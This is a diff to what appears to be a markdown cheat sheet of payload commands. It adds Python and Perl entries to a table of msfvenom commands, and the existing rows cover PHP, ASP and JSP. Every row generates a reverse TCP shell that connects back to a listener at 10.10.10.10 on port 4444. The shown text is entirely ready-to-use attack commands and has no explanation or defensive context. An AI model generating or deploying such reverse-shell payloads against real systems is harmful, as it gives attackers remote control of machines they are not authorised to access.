@@ -81,3 +81,5 @@ Below are some different payload commands. I have grouped them with a heading to
 | PHP Reverse TCP | `msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > shell.php` |
 | ASP Reverse TCP | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f asp > shell.asp` |
 | JSP Reverse TCP | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > shell.jsp` |
+| Python Reverse TCP | `msfvenom -p python/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > shell.py` |
+| Perl Reverse TCP | `msfvenom -p cmd/unix/reverse_perl LHOST=10.10.10.10 LPORT=4444 -f raw > shell.pl` |
